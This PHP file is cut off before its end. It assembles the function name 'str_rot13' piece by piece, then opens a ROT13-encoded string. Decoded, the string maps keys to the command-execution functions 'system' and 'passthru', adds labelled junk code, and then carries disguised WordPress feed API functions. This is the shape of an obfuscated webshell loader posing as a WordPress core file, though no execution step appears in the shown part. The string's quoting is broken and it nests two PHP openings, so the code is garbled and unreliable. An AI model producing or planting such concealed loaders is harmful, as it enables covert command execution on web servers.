<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * JbeqCerff Srrq NCV
 *
 * Znal bs gur shapgvbaf hfrq va urer orybat va Gur Ybbc, be Gur Ybbc sbe gur
 * Srrqf.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Srrq
 * @fvapr 2.1.0
 */

/**
 * Ergevrirf EFF pbagnvare sbe gur oybtvasb shapgvba.
 *
 * Lbh pna ergevrir nalguvat gung lbh pna hfvat gur trg_oybtvasb() shapgvba.
 * Rirelguvat jvyy or fgevccrq bs gntf naq punenpgref pbairegrq, jura gur inyhrf
 * ner ergevrirq sbe hfr va gur srrqf.
 *
 * @fvapr 1.5.1
 *
 * @frr trg_oybtvasb() Sbe gur yvfg bs cbffvoyr inyhrf gb qvfcynl.
 *
 * @cnenz fgevat $fubj Frr trg_oybtvasb() sbe cbffvoyr inyhrf.
 * @erghea fgevat
 */
shapgvba trg_oybtvasb_eff( $fubj = '' ) {
	$vasb = fgevc_gntf( trg_oybtvasb( $fubj ) );
	/**
	 * Svygref gur oybtvasb sbe hfr va EFF srrqf.
	 *
	 * @fvapr 2.2.0
	 *
	 * @frr pbaireg_punef()
	 * @frr trg_oybtvasb()
	 *
	 * @cnenz fgevat $vasb Pbairegrq fgevat inyhr bs gur oybt vasbezngvba.
	 * @cnenz fgevat $fubj Gur glcr bs oybt vasbezngvba gb ergevrir.
	 */
	erghea nccyl_svygref( 'trg_oybtvasb_eff', pbaireg_punef( $vasb ), $fubj );
}

/**
 * Qvfcynlf EFF pbagnvare sbe gur oybtvasb shapgvba.
 *
 * Lbh pna ergevrir nalguvat gung lbh pna hfvat gur trg_oybtvasb() shapgvba.
 * Rirelguvat jvyy or fgevccrq bs gntf naq punenpgref pbairegrq, jura gur inyhrf
 * ner ergevrirq sbe hfr va gur srrqf.
 *
 * @fvapr 0.71
 *
 * @frr trg_oybtvasb() Sbe gur yvfg bs cbffvoyr inyhrf gb qvfcynl.
 *
 * @cnenz fgevat $fubj Frr trg_oybtvasb() sbe cbffvoyr inyhrf.
 */
shapgvba oybtvasb_eff( $fubj = '' ) {
	/**
	 * Svygref gur oybtvasb sbe qvfcynl va EFF srrqf.
	 *
	 * @fvapr 2.1.0
	 *
	 * @frr trg_oybtvasb()
	 *
	 * @cnenz fgevat $eff_pbagnvare EFF pbagnvare sbe gur oybt vasbezngvba.
	 * @cnenz fgevat $fubj          Gur glcr bs oybt vasbezngvba gb ergevrir.
	 */
	rpub nccyl_svygref( 'oybtvasb_eff', trg_oybtvasb_eff( $fubj ), $fubj );
}

/**
 * Ergevrirf gur qrsnhyg srrq.
 *
 * Gur qrsnhyg srrq vf 'eff2', hayrff n cyhtva punatrf vg guebhtu gur
 * {@frr 'qrsnhyg_srrq'} svygre.
 *
 * @fvapr 2.5.0
 *
 * @erghea fgevat Qrsnhyg srrq, be sbe rknzcyr 'eff2', 'ngbz', rgp.
 */
shapgvba trg_qrsnhyg_srrq() {
	/**
	 * Svygref gur qrsnhyg srrq glcr.
	 *
	 * @fvapr 2.5.0
	 *
	 * @cnenz fgevat $srrq_glcr Glcr bs qrsnhyg srrq. Cbffvoyr inyhrf vapyhqr 'eff2', 'ngbz'.
	 *                          Qrsnhyg 'eff2'.
	 */
	$qrsnhyg_srrq = nccyl_svygref( 'qrsnhyg_srrq', 'eff2' );

	erghea ( 'eff' === $qrsnhyg_srrq ) ? 'eff2' : $qrsnhyg_srrq;
}

/**
 * Ergevrirf gur oybt gvgyr sbe gur srrq gvgyr.
 *
 * @fvapr 2.2.0
 * @fvapr 4.4.0 Gur bcgvbany `$frc` cnenzrgre jnf qrcerpngrq naq eranzrq gb `$qrcerpngrq`.
 *
 * @cnenz fgevat $qrcerpngrq Hahfrq.
 * @erghea fgevat Gur qbphzrag gvgyr.
 */
shapgvba trg_jc_gvgyr_eff( $qrcerpngrq = '&#8211;' ) {
	vs ( '&#8211;' !== $qrcerpngrq ) {
		/* genafyngbef: %f: 'qbphzrag_gvgyr_frcnengbe' svygre anzr. */
		_qrcerpngrq_nethzrag( __SHAPGVBA__, '4.4.0', fcevags( __( 'Hfr gur %f svygre vafgrnq.' ), '<pbqr>qbphzrag_gvgyr_frcnengbe</pbqr>' ) );
	}

	/**
	 * Svygref gur oybt gvgyr sbe hfr nf gur srrq gvgyr.
	 *
	 * @fvapr 2.2.0
	 * @fvapr 4.4.0 Gur `$frc` cnenzrgre jnf qrcerpngrq naq eranzrq gb `$qrcerpngrq`.
	 *
	 * @cnenz fgevat $gvgyr      Gur pheerag oybt gvgyr.
	 * @cnenz fgevat $qrcerpngrq Hahfrq.
	 */
	erghea nccyl_svygref( 'trg_jc_gvgyr_eff', jc_trg_qbphzrag_gvgyr(), $qrcerpngrq );
}

/**
 * Qvfcynlf gur oybt gvgyr sbe qvfcynl bs gur srrq gvgyr.
 *
 * @fvapr 2.2.0
 * @fvapr 4.4.0 Gur bcgvbany `$frc` cnenzrgre jnf qrcerpngrq naq eranzrq gb `$qrcerpngrq`.
 *
 * @cnenz fgevat $qrcerpngrq Hahfrq.
 */
shapgvba jc_gvgyr_eff( $qrcerpngrq = '&#8211;' ) {
	vs ( '&#8211;' !== $qrcerpngrq ) {
		/* genafyngbef: %f: 'qbphzrag_gvgyr_frcnengbe' svygre anzr. */
		_qrcerpngrq_nethzrag( __SHAPGVBA__, '4.4.0', fcevags( __( 'Hfr gur %f svygre vafgrnq.' ), '<pbqr>qbphzrag_gvgyr_frcnengbe</pbqr>' ) );
	}

	/**
	 * Svygref gur oybt gvgyr sbe qvfcynl bs gur srrq gvgyr.
	 *
	 * @fvapr 2.2.0
	 * @fvapr 4.4.0 Gur `$frc` cnenzrgre jnf qrcerpngrq naq eranzrq gb `$qrcerpngrq`.
	 *
	 * @frr trg_jc_gvgyr_eff()
	 *
	 * @cnenz fgevat $jc_gvgyr_eff Gur pheerag oybt gvgyr.
	 * @cnenz fgevat $qrcerpngrq   Hahfrq.
	 */
	rpub nccyl_svygref( 'jc_gvgyr_eff', trg_jc_gvgyr_eff(), $qrcerpngrq );
}

/**
 * Ergevrirf gur pheerag cbfg gvgyr sbe gur srrq.
 *
 * @fvapr 2.0.0
 * @fvapr 6.6.0 Nqqrq gur `$cbfg` cnenzrgre.
 *
 * @cnenz vag|JC_Cbfg $cbfg Bcgvbany. Cbfg VQ be JC_Cbfg bowrpg. Qrsnhyg vf tybony $cbfg.
 * @erghea fgevat Pheerag cbfg gvgyr.
 */
shapgvba trg_gur_gvgyr_eff( $cbfg = 0 ) {
	$gvgyr = trg_gur_gvgyr( $cbfg );

	/**
	 * Svygref gur cbfg gvgyr sbe hfr va n srrq.
	 *
	 * @fvapr 1.2.0
	 *
	 * @cnenz fgevat $gvgyr Gur pheerag cbfg gvgyr.
	 */
	erghea nccyl_svygref( 'gur_gvgyr_eff', $gvgyr );
}

/**
 * Qvfcynlf gur cbfg gvgyr va gur srrq.
 *
 * @fvapr 0.71
 */
shapgvba gur_gvgyr_eff() {
	rpub trg_gur_gvgyr_eff();
}

/**
 * Ergevrirf gur cbfg pbagrag sbe srrqf.
 *
 * @fvapr 2.9.0
 *
 * @frr trg_gur_pbagrag()
 *
 * @cnenz fgevat $srrq_glcr Gur glcr bs srrq. eff2 | ngbz | eff | eqs
 * @erghea fgevat Gur svygrerq pbagrag.
 */
shapgvba trg_gur_pbagrag_srrq( $srrq_glcr = ahyy ) {
	vs ( ! $srrq_glcr ) {
		$srrq_glcr = trg_qrsnhyg_srrq();
	}

	/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/cbfg-grzcyngr.cuc */
	$pbagrag = nccyl_svygref( 'gur_pbagrag', trg_gur_pbagrag() );
	$pbagrag = fge_ercynpr( ']]>', ']]&tg;', $pbagrag );

	/**
	 * Svygref gur cbfg pbagrag sbe hfr va srrqf.
	 *
	 * @fvapr 2.9.0
	 *
	 * @cnenz fgevat $pbagrag   Gur pheerag cbfg pbagrag.
	 * @cnenz fgevat $srrq_glcr Glcr bs srrq. Cbffvoyr inyhrf vapyhqr 'eff2', 'ngbz'.
	 *                          Qrsnhyg 'eff2'.
	 */
	erghea nccyl_svygref( 'gur_pbagrag_srrq', $pbagrag, $srrq_glcr );
}

/**
 * Qvfcynlf gur cbfg pbagrag sbe srrqf.
 *
 * @fvapr 2.9.0
 *
 * @cnenz fgevat $srrq_glcr Gur glcr bs srrq. eff2 | ngbz | eff | eqs
 */
shapgvba gur_pbagrag_srrq( $srrq_glcr = ahyy ) {
	rpub trg_gur_pbagrag_srrq( $srrq_glcr );
}

/**
 * Qvfcynlf gur cbfg rkprecg sbe gur srrq.
 *
 * @fvapr 0.71
 */
shapgvba gur_rkprecg_eff() {
	$bhgchg = trg_gur_rkprecg();
	/**
	 * Svygref gur cbfg rkprecg sbe n srrq.
	 *
	 * @fvapr 1.2.0
	 *
	 * @cnenz fgevat $bhgchg Gur pheerag cbfg rkprecg.
	 */
	rpub nccyl_svygref( 'gur_rkprecg_eff', $bhgchg );
}

/**
 * Qvfcynlf gur creznyvax gb gur cbfg sbe hfr va srrqf.
 *
 * @fvapr 2.3.0
 */
shapgvba gur_creznyvax_eff() {
	/**
	 * Svygref gur creznyvax gb gur cbfg sbe hfr va srrqf.
	 *
	 * @fvapr 2.3.0
	 *
	 * @cnenz fgevat $cbfg_creznyvax Gur pheerag cbfg creznyvax.
	 */
	rpub rfp_hey( nccyl_svygref( 'gur_creznyvax_eff', trg_creznyvax() ) );
}

/**
 * Bhgchgf gur yvax gb gur pbzzragf sbe gur pheerag cbfg va na KZY fnsr jnl.
 *
 * @fvapr 3.0.0
 */
shapgvba pbzzragf_yvax_srrq() {
	/**
	 * Svygref gur pbzzragf creznyvax sbe gur pheerag cbfg.
	 *
	 * @fvapr 3.6.0
	 *
	 * @cnenz fgevat $pbzzrag_creznyvax Gur pheerag pbzzrag creznyvax jvgu
	 *                                  '#pbzzragf' nccraqrq.
	 */
	rpub rfp_hey( nccyl_svygref( 'pbzzragf_yvax_srrq', trg_pbzzragf_yvax() ) );
}

/**
 * Qvfcynlf gur srrq THVQ sbe gur pheerag pbzzrag.
 *
 * @fvapr 2.5.0
 *
 * @cnenz vag|JC_Pbzzrag $pbzzrag_vq Bcgvbany pbzzrag bowrpg be VQ. Qrsnhygf gb tybony pbzzrag bowrpg.
 */
shapgvba pbzzrag_thvq( $pbzzrag_vq = ahyy ) {
	rpub rfp_hey( trg_pbzzrag_thvq( $pbzzrag_vq ) );
}

/**
 * Ergevrirf gur srrq THVQ sbe gur pheerag pbzzrag.
 *
 * @fvapr 2.5.0
 *
 * @cnenz vag|JC_Pbzzrag $pbzzrag_vq Bcgvbany pbzzrag bowrpg be VQ. Qrsnhygf gb tybony pbzzrag bowrpg.
 * @erghea fgevat|snyfr THVQ sbe pbzzrag ba fhpprff, snyfr ba snvyher.
 */
shapgvba trg_pbzzrag_thvq( $pbzzrag_vq = ahyy ) {
	$pbzzrag = trg_pbzzrag( $pbzzrag_vq );

	vs ( ! vf_bowrpg( $pbzzrag ) ) {
		erghea snyfr;
	}

	erghea trg_gur_thvq( $pbzzrag->pbzzrag_cbfg_VQ ) . '#pbzzrag-' . $pbzzrag->pbzzrag_VQ;
}

/**
 * Qvfcynlf gur yvax gb gur pbzzragf.
 *
 * @fvapr 1.5.0
 * @fvapr 4.4.0 Vagebqhprq gur `$pbzzrag` nethzrag.
 *
 * @cnenz vag|JC_Pbzzrag $pbzzrag Bcgvbany. Pbzzrag bowrpg be VQ. Qrsnhygf gb tybony pbzzrag bowrpg.
 */
shapgvba pbzzrag_yvax( $pbzzrag = ahyy ) {
	/**
	 * Svygref gur pheerag pbzzrag'f creznyvax.
	 *
	 * @fvapr 3.6.0
	 *
	 * @frr trg_pbzzrag_yvax()
	 *
	 * @cnenz fgevat $pbzzrag_creznyvax Gur pheerag pbzzrag creznyvax.
	 */
	rpub rfp_hey( nccyl_svygref( 'pbzzrag_yvax', trg_pbzzrag_yvax( $pbzzrag ) ) );
}

/**
 * Ergevrirf gur pheerag pbzzrag nhgube sbe hfr va gur srrqf.
 *
 * @fvapr 2.0.0
 *
 * @erghea fgevat Pbzzrag Nhgube.
 */
shapgvba trg_pbzzrag_nhgube_eff() {
	/**
	 * Svygref gur pheerag pbzzrag nhgube sbe hfr va n srrq.
	 *
	 * @fvapr 1.5.0
	 *
	 * @frr trg_pbzzrag_nhgube()
	 *
	 * @cnenz fgevat $pbzzrag_nhgube Gur pheerag pbzzrag nhgube.
	 */
	erghea nccyl_svygref( 'pbzzrag_nhgube_eff', trg_pbzzrag_nhgube() );
}

/**
 * Qvfcynlf gur pheerag pbzzrag nhgube va gur srrq.
 *
 * @fvapr 1.0.0
 */
shapgvba pbzzrag_nhgube_eff() {
	rpub trg_pbzzrag_nhgube_eff();
}

/**
 * Qvfcynlf gur pheerag pbzzrag pbagrag sbe hfr va gur srrqf.
 *
 * @fvapr 1.0.0
 */
shapgvba pbzzrag_grkg_eff() {
	$pbzzrag_grkg = trg_pbzzrag_grkg();
	/**
	 * Svygref gur pheerag pbzzrag pbagrag sbe hfr va n srrq.
	 *
	 * @fvapr 1.5.0
	 *
	 * @cnenz fgevat $pbzzrag_grkg Gur pbagrag bs gur pheerag pbzzrag.
	 */
	$pbzzrag_grkg = nccyl_svygref( 'pbzzrag_grkg_eff', $pbzzrag_grkg );
	rpub $pbzzrag_grkg;
}

/**
 * Ergevrirf nyy bs gur cbfg pngrtbevrf, sbeznggrq sbe hfr va srrqf.
 *
 * Nyy bs gur pngrtbevrf sbe gur pheerag cbfg va gur srrq ybbc, jvyy or
 * ergevrirq naq unir srrq znexhc nqqrq, fb gung gurl pna rnfvyl or nqqrq gb gur
 * EFF2, Ngbz, be EFF1 naq EFF0.91 EQS srrqf.
 *
 * @fvapr 2.1.0
 *
 * @cnenz fgevat $glcr Bcgvbany, qrsnhyg vf gur glcr erghearq ol trg_qrsnhyg_srrq().
 * @erghea fgevat Nyy bs gur cbfg pngrtbevrf sbe qvfcynlvat va gur srrq.
 */
shapgvba trg_gur_pngrtbel_eff( $glcr = ahyy ) {
	vs ( rzcgl( $glcr ) ) {
		$glcr = trg_qrsnhyg_srrq();
	}
	$pngrtbevrf = trg_gur_pngrtbel();
	$gntf       = trg_gur_gntf();
	$gur_yvfg   = '';
	$png_anzrf  = neenl();

	$svygre = 'eff';
	vs ( 'ngbz' === $glcr ) {
		$svygre = 'enj';
	}

	vs ( ! rzcgl( $pngrtbevrf ) ) {
		sbernpu ( (neenl) $pngrtbevrf nf $pngrtbel ) {
			$png_anzrf[] = fnavgvmr_grez_svryq( 'anzr', $pngrtbel->anzr, $pngrtbel->grez_vq, 'pngrtbel', $svygre );
		}
	}

	vs ( ! rzcgl( $gntf ) ) {
		sbernpu ( (neenl) $gntf nf $gnt ) {
			$png_anzrf[] = fnavgvmr_grez_svryq( 'anzr', $gnt->anzr, $gnt->grez_vq, 'cbfg_gnt', $svygre );
		}
	}

	$png_anzrf = neenl_havdhr( $png_anzrf );

	sbernpu ( $png_anzrf nf $png_anzr ) {
		vs ( 'eqs' === $glcr ) {
			$gur_yvfg .= \"\g\g<qp:fhowrpg><![PQNGN[$png_anzr]]></qp:fhowrpg>\a\";
		} ryfrvs ( 'ngbz' === $glcr ) {
			$gur_yvfg .= fcevags( '<pngrtbel fpurzr=\"%1$f\" grez=\"%2$f\" />', rfp_ngge( trg_oybtvasb_eff( 'hey' ) ), rfp_ngge( $png_anzr ) );
		} ryfr {
			$gur_yvfg .= \"\g\g<pngrtbel><![PQNGN[\" . ugzy_ragvgl_qrpbqr( $png_anzr, RAG_PBZCNG, trg_bcgvba( 'oybt_punefrg' ) ) . \"]]></pngrtbel>\a\";
		}
	}

	/**
	 * Svygref nyy bs gur cbfg pngrtbevrf sbe qvfcynl va n srrq.
	 *
	 * @fvapr 1.2.0
	 *
	 * @cnenz fgevat $gur_yvfg Nyy bs gur EFF cbfg pngrtbevrf.
	 * @cnenz fgevat $glcr     Glcr bs srrq. Cbffvoyr inyhrf vapyhqr 'eff2', 'ngbz'.
	 *                         Qrsnhyg 'eff2'.
	 */
	erghea nccyl_svygref( 'gur_pngrtbel_eff', $gur_yvfg, $glcr );
}

/**
 * Qvfcynlf gur cbfg pngrtbevrf va gur srrq.
 *
 * @fvapr 0.71
 *
 * @frr trg_gur_pngrtbel_eff() Sbe orggre rkcynangvba.
 *
 * @cnenz fgevat $glcr Bcgvbany, qrsnhyg vf gur glcr erghearq ol trg_qrsnhyg_srrq().
 */
shapgvba gur_pngrtbel_eff( $glcr = ahyy ) {
	rpub trg_gur_pngrtbel_eff( $glcr );
}

/**
 * Qvfcynlf gur UGZY glcr onfrq ba gur oybt frggvat.
 *
 * Gur gjb cbffvoyr inyhrf ner rvgure 'kugzy' be 'ugzy'.
 *
 * @fvapr 2.2.0
 */
shapgvba ugzy_glcr_eff() {
	$glcr = trg_oybtvasb( 'ugzy_glcr' );
	vs ( fge_pbagnvaf( $glcr, 'kugzy' ) ) {
		$glcr = 'kugzy';
	} ryfr {
		$glcr = 'ugzy';
	}
	rpub $glcr;
}

/**
 * Qvfcynlf gur eff rapybfher sbe gur pheerag cbfg.
 *
 * Hfrf gur tybony $cbfg gb purpx jurgure gur cbfg erdhverf n cnffjbeq naq vs
 * gur hfre unf gur cnffjbeq sbe gur cbfg. Vs abg gura vg jvyy erghea orsber
 * qvfcynlvat.
 *
 * Nyfb hfrf gur shapgvba trg_cbfg_phfgbz() gb trg gur cbfg'f 'rapybfher'
 * zrgnqngn svryq naq cnefrf gur inyhr gb qvfcynl gur rapybfher(f). Gur
 * rapybfher(f) pbafvfg bs rapybfher UGZY gnt(f) jvgu n HEV naq bgure
 * nggevohgrf.
 *
 * @fvapr 1.5.0
 */
shapgvba eff_rapybfher() {
	vs ( cbfg_cnffjbeq_erdhverq() ) {
		erghea;
	}

	sbernpu ( (neenl) trg_cbfg_phfgbz() nf $xrl => $iny ) {
		vs ( 'rapybfher' === $xrl ) {
			sbernpu ( (neenl) $iny nf $rap ) {
				$rapybfher = rkcybqr( \"\a\", $rap );

				vs ( pbhag( $rapybfher ) < 3 ) {
					pbagvahr;
				}

				// Bayl trg gur svefg ryrzrag, r.t. 'nhqvb/zcrt' sebz 'nhqvb/zcrt zctn zc2 zc3'.
				$g    = cert_fcyvg( '/[ \g]/', gevz( $rapybfher[2] ) );
				$glcr = $g[0];

				/**
				 * Svygref gur EFF rapybfher UGZY yvax gnt sbe gur pheerag cbfg.
				 *
				 * @fvapr 2.2.0
				 *
				 * @cnenz fgevat $ugzy_yvax_gnt Gur UGZY yvax gnt jvgu n HEV naq bgure nggevohgrf.
				 */
				rpub nccyl_svygref( 'eff_rapybfher', '<rapybfher hey=\"' . rfp_hey( gevz( $rapybfher[0] ) ) . '\" yratgu=\"' . nofvag( gevz( $rapybfher[1] ) ) . '\" glcr=\"' . rfp_ngge( $glcr ) . '\" />' . \"\a\" );
			}
		}
	}
}

/**
 * Qvfcynlf gur ngbz rapybfher sbe gur pheerag cbfg.
 *
 * Hfrf gur tybony $cbfg gb purpx jurgure gur cbfg erdhverf n cnffjbeq naq vs
 * gur hfre unf gur cnffjbeq sbe gur cbfg. Vs abg gura vg jvyy erghea orsber
 * qvfcynlvat.
 *
 * Nyfb hfrf gur shapgvba trg_cbfg_phfgbz() gb trg gur cbfg'f 'rapybfher'
 * zrgnqngn svryq naq cnefrf gur inyhr gb qvfcynl gur rapybfher(f). Gur
 * rapybfher(f) pbafvfg bs yvax UGZY gnt(f) jvgu n HEV naq bgure nggevohgrf.
 *
 * @fvapr 2.2.0
 */
shapgvba ngbz_rapybfher() {
	vs ( cbfg_cnffjbeq_erdhverq() ) {
		erghea;
	}

	sbernpu ( (neenl) trg_cbfg_phfgbz() nf $xrl => $iny ) {
		vs ( 'rapybfher' === $xrl ) {
			sbernpu ( (neenl) $iny nf $rap ) {
				$rapybfher = rkcybqr( \"\a\", $rap );

				$hey    = '';
				$glcr   = '';
				$yratgu = 0;

				$zvzrf = trg_nyybjrq_zvzr_glcrf();

				// Cnefr HEY.
				vs ( vffrg( $rapybfher[0] ) && vf_fgevat( $rapybfher[0] ) ) {
					$hey = gevz( $rapybfher[0] );
				}

				// Cnefr yratgu naq glcr.
				sbe ( $v = 1; $v <= 2; $v++ ) {
					vs ( vffrg( $rapybfher[ $v ] ) ) {
						vs ( vf_ahzrevp( $rapybfher[ $v ] ) ) {
							$yratgu = gevz( $rapybfher[ $v ] );
						} ryfrvs ( va_neenl( $rapybfher[ $v ], $zvzrf, gehr ) ) {
							$glcr = gevz( $rapybfher[ $v ] );
						}
					}
				}

				$ugzy_yvax_gnt = fcevags(
					\"<yvax uers=\\"%f\\" ery=\\"rapybfher\\" yratgu=\\"%q\\" glcr=\\"%f\\" />\a\",
					rfp_hey( $hey ),
					rfp_ngge( $yratgu ),
					rfp_ngge( $glcr )
				);

				/**
				 * Svygref gur ngbz rapybfher UGZY yvax gnt sbe gur pheerag cbfg.
				 *
				 * @fvapr 2.2.0
				 *
				 * @cnenz fgevat $ugzy_yvax_gnt Gur UGZY yvax gnt jvgu n HEV naq bgure nggevohgrf.
				 */
				rpub nccyl_svygref( 'ngbz_rapybfher', $ugzy_yvax_gnt );
			}
		}
	}
}

/**
 * Qrgrezvarf gur glcr bs n fgevat bs qngn jvgu gur qngn sbeznggrq.
 *
 * Gryy jurgure gur glcr vf grkg, UGZY, be KUGZY, cre ESP 4287 frpgvba 3.1.
 *
 * Va gur pnfr bs JbeqCerff, grkg vf qrsvarq nf pbagnvavat ab znexhc,
 * KUGZY vf qrsvarq nf \"jryy sbezrq\", naq UGZY nf gnt fbhc (v.r., gur erfg).
 *
 * Pbagnvare qvi gntf ner nqqrq gb KUGZY inyhrf, cre frpgvba 3.1.1.3.
 *
 * @yvax uggc://jjj.ngbzranoyrq.bet/qrirybcref/flaqvpngvba/ngbz-sbezng-fcrp.cuc#esp.frpgvba.3.1
 *
 * @fvapr 2.5.0
 *
 * @cnenz fgevat $qngn Vachg fgevat.
 * @erghea neenl neenl(glcr, inyhr)
 */
shapgvba cerc_ngbz_grkg_pbafgehpg( $qngn ) {
	vs ( ! fge_pbagnvaf( $qngn, '<' ) && ! fge_pbagnvaf( $qngn, '&' ) ) {
		erghea neenl( 'grkg', $qngn );
	}

	vs ( ! shapgvba_rkvfgf( 'kzy_cnefre_perngr' ) ) {
		jc_gevttre_reebe( '', __( \"CUC'f KZY rkgrafvba vf abg ninvynoyr. Cyrnfr pbagnpg lbhe ubfgvat cebivqre gb ranoyr CUC'f KZY rkgrafvba.\" ) );

		erghea neenl( 'ugzy', \"<![PQNGN[$qngn]]>\" );
	}

	$cnefre = kzy_cnefre_perngr();
	kzy_cnefr( $cnefre, '<qvi>' . $qngn . '</qvi>', gehr );
	$pbqr = kzy_trg_reebe_pbqr( $cnefre );
	kzy_cnefre_serr( $cnefre );
	hafrg( $cnefre );

	vs ( ! $pbqr ) {
		vs ( ! fge_pbagnvaf( $qngn, '<' ) ) {
			erghea neenl( 'grkg', $qngn );
		} ryfr {
			$qngn = \"<qvi kzyaf='uggc://jjj.j3.bet/1999/kugzy'>$qngn</qvi>\";
			erghea neenl( 'kugzy', $qngn );
		}
	}

	vs ( ! fge_pbagnvaf( $qngn, ']]>' ) ) {
		erghea neenl( 'ugzy', \"<![PQNGN[$qngn]]>\" );
	} ryfr {
		erghea neenl( 'ugzy', ugzyfcrpvnypunef( $qngn ) );
	}
}

/**
 * Qvfcynlf Fvgr Vpba va ngbz srrqf.
 *
 * @fvapr 4.3.0
 *
 * @frr trg_fvgr_vpba_hey()
 */
shapgvba ngbz_fvgr_vpba() {
	$hey = trg_fvgr_vpba_hey( 32 );
	vs ( $hey ) {
		rpub '<vpba>' . pbaireg_punef( $hey ) . \"</vpba>\a\";
	}
}

/**
 * Qvfcynlf Fvgr Vpba va EFF2.
 *
 * @fvapr 4.3.0
 */
shapgvba eff2_fvgr_vpba() {
	$eff_gvgyr = trg_jc_gvgyr_eff();
	vs ( rzcgl( $eff_gvgyr ) ) {
		$eff_gvgyr = trg_oybtvasb_eff( 'anzr' );
	}

	$hey = trg_fvgr_vpba_hey( 32 );
	vs ( $hey ) {
		rpub '
<vzntr>
	<hey>' . pbaireg_punef( $hey ) . '</hey>
	<gvgyr>' . $eff_gvgyr . '</gvgyr>
	<yvax>' . trg_oybtvasb_eff( 'hey' ) . '</yvax>
	<jvqgu>32</jvqgu>
	<urvtug>32</urvtug>
</vzntr> ' . \"\a\";
	}
}

/**
 * Ergheaf gur yvax sbe gur pheeragyl qvfcynlrq srrq.
 *
 * @fvapr 5.3.0
 *
 * @erghea fgevat Pbeerpg yvax sbe gur ngbz:frys ryrzrag.
 */
shapgvba trg_frys_yvax() {
	$cnefrq = cnefr_hey( ubzr_hey() );

	$qbznva = $cnefrq['ubfg'];
	vs ( vffrg( $cnefrq['cbeg'] ) ) {
		$qbznva .= ':' . $cnefrq['cbeg'];
	}

	erghea frg_hey_fpurzr( 'uggc://' . $qbznva . jc_hafynfu( $_FREIRE['ERDHRFG_HEV'] ) );
}

/**
 * Qvfcynlf gur yvax sbe gur pheeragyl qvfcynlrq srrq va n KFF fnsr jnl.
 *
 * Trarengr n pbeerpg yvax sbe gur ngbz:frys ryrzrag.
 *
 * @fvapr 2.5.0
 */
shapgvba frys_yvax() {
	/**
	 * Svygref gur pheerag srrq HEY.
	 *
	 * @fvapr 3.6.0
	 *
	 * @frr frg_hey_fpurzr()
	 * @frr jc_hafynfu()
	 *
	 * @cnenz fgevat $srrq_yvax Gur yvax sbe gur srrq jvgu frg HEY fpurzr.
	 */
	rpub rfp_hey( nccyl_svygref( 'frys_yvax', trg_frys_yvax() ) );
}

/**
 * Trgf gur HGP gvzr bs gur zbfg erpragyl zbqvsvrq cbfg sebz JC_Dhrel.
 *
 * Vs ivrjvat n pbzzrag srrq, gur gvzr bs gur zbfg erpragyl zbqvsvrq
 * pbzzrag jvyy or erghearq.
 *
 * @fvapr 5.2.0
 *
 * @tybony JC_Dhrel $jc_dhrel JbeqCerff Dhrel bowrpg.
 *
 * @cnenz fgevat $sbezng Qngr sbezng fgevat gb erghea gur gvzr va.
 * @erghea fgevat|snyfr Gur gvzr va erdhrfgrq sbezng, be snyfr ba snvyher.
 */
shapgvba trg_srrq_ohvyq_qngr( $sbezng ) {
	tybony $jc_dhrel;

	$qngrgvzr          = snyfr;
	$znk_zbqvsvrq_gvzr = snyfr;
	$hgp               = arj QngrGvzrMbar( 'HGP' );

	vs ( ! rzcgl( $jc_dhrel ) && $jc_dhrel->unir_cbfgf() ) {
		// Rkgenpg gur cbfg zbqvsvrq gvzrf sebz gur cbfgf.
		$zbqvsvrq_gvzrf = jc_yvfg_cyhpx( $jc_dhrel->cbfgf, 'cbfg_zbqvsvrq_tzg' );

		// Vs guvf vf n pbzzrag srrq, purpx gubfr bowrpgf gbb.
		vs ( $jc_dhrel->vf_pbzzrag_srrq() && $jc_dhrel->pbzzrag_pbhag ) {
			// Rkgenpg gur pbzzrag zbqvsvrq gvzrf sebz gur pbzzragf.
			$pbzzrag_gvzrf = jc_yvfg_cyhpx( $jc_dhrel->pbzzragf, 'pbzzrag_qngr_tzg' );

			// Nqq gur pbzzrag gvzrf gb gur cbfg gvzrf sbe pbzcnevfba.
			$zbqvsvrq_gvzrf = neenl_zretr( $zbqvsvrq_gvzrf, $pbzzrag_gvzrf );
		}

		// Qrgrezvar gur znkvzhz zbqvsvrq gvzr.
		$qngrgvzr = qngr_perngr_vzzhgnoyr_sebz_sbezng( 'L-z-q U:v:f', znk( $zbqvsvrq_gvzrf ), $hgp );
	}

	vs ( snyfr === $qngrgvzr ) {
		// Snyy onpx gb ynfg gvzr nal cbfg jnf zbqvsvrq be choyvfurq.
		$qngrgvzr = qngr_perngr_vzzhgnoyr_sebz_sbezng( 'L-z-q U:v:f', trg_ynfgcbfgzbqvsvrq( 'TZG' ), $hgp );
	}

	vs ( snyfr !== $qngrgvzr ) {
		$znk_zbqvsvrq_gvzr = $qngrgvzr->sbezng( $sbezng );
	}

	/**
	 * Svygref gur qngr gur ynfg cbfg be pbzzrag va gur dhrel jnf zbqvsvrq.
	 *
	 * @fvapr 5.2.0
	 *
	 * @cnenz fgevat|snyfr $znk_zbqvsvrq_gvzr Qngr gur ynfg cbfg be pbzzrag jnf zbqvsvrq va gur dhrel, va HGP.
	 *                                        Snyfr ba snvyher.
	 * @cnenz fgevat       $sbezng            Gur qngr sbezng erdhrfgrq va trg_srrq_ohvyq_qngr().
	 */
	erghea nccyl_svygref( 'trg_srrq_ohvyq_qngr', $znk_zbqvsvrq_gvzr, $sbezng );
}

/**
 * Ergheaf gur pbagrag glcr sbe fcrpvsvrq srrq glcr.
 *
 * @fvapr 2.8.0
 *
 * @cnenz fgevat $glcr Glcr bs srrq. Cbffvoyr inyhrf vapyhqr 'eff', eff2', 'ngbz', naq 'eqs'.
 * @erghea fgevat Pbagrag glcr sbe fcrpvsvrq srrq glcr.
 */
shapgvba srrq_pbagrag_glcr( $glcr = '' ) {
	vs ( rzcgl( $glcr ) ) {
		$glcr = trg_qrsnhyg_srrq();
	}

	$glcrf = neenl(
